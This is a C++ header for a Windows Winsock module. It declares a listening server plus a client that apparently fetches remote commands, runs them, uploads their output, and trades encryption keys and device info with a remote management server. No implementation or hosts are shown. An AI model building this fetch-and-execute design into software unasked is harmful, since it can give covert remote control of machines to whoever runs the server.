#ifndef NETWORK_H
#define NETWORK_H

#include <winsock2.h>
#include <WS2tcpip.h>
#include <string>
#include <HTTPRequest.hpp>
#include "utils.h"
#include "runCode.h"
#include "sharedRes.h"
//#include "crypto.h"

#pragma comment(lib,"ws2_32.lib")

struct ServerThreadArgs {
    std::string encryptionKey;
    SOCKET ListenSocket;
    SharedList<HANDLE>*CLhandles;
    std::string port;
};


struct ClientSocketThreadArgs{
    std::string encryptionKey;
    SOCKET ClientSocket;
    SharedList<HANDLE>*CLhandles;
};

class Server {
    private:
        std::string encryptionKey;
        std::string port;
        HANDLE hThread;
        SOCKET listenSocket;
        ServerThreadArgs sta;
        SharedList<HANDLE>*CLhandles;
    public:
        Server(){}
        Server(std::string encryptionKeyArg);
        Server &operator=(const Server &server);
        void Start(std::string port, bool encrypted = false);
        void Stop();
        HANDLE gethThread();
        std::string getPort();
};

class Network {
    private:
        std::string encryptionKey;
        std::string defaultEncryptionKey;
        std::string serverAddress;
        std::string port;
        std::string associatedUser;
    public:
        Server server;
        Network(){} 
        Network(const std::string &encryptionKeyArg);

        Network(const std::string &serverAddress, const std::string &port,
            const std::string &associatedUser,
            const std::string &encryptionKey);

        Network(const std::string &serverAddress, const std::string &port,
            const std::string &associatedUser,
            const std::string &encryptionKey,const std::string &defaultEncryptionKey);

        Network &operator=(const Network &network);

        std::string RawRequest(const std::string &serverAddr, const std::string &port, const std::string &request);
        std::string fetchCommand(const std::string &encryptionKey);
        bool uploadCommandsOutput(std::string commandsOutput,const std::string &encryptionKey);
        std::string ResolveAddress(const std::string &address);
        std::string GetEncryptionKeyFromRMS(const std::string &serverAddr, const std::string &port, const std::string &associatedUser);
        //static std::string RawRequest(const std::string &serverAddr, const std::string &port, const std::string &request);
        //static std::string ResolveAddress(const std::string &address);
        //static std::string GetEncryptionKeyFromRMS(const std::string &serverAddr, const std::string &port, const std::string &associatedUser,const std::string &encryptionKey);
        bool UploadInfoToRMS();
        std::string GetEncryptionKeyFromRMS();
        bool UploadInfoToRMS(const std::string &serverAddr, const std::string &port, const std::string &associatedUser, const std::string &serverPort, const std::string &encryptionKey,const std::string &defaultEncryptionKey);
};

class Device {
    private:
        std::string name;
        std::string serverPort;
    public:
        Device(){}
        Device(std::string nameArg,std::string serverPort);
        Device &operator=(const Device &device);
        std::string getName();
        std::string getServerPort();
        void setName(std::string nameArg);
        void setServerPort(std::string serverPort);    
};

DWORD WINAPI ServerThread(void *arg);
DWORD WINAPI ClientSocketThread(void *arg);


#endif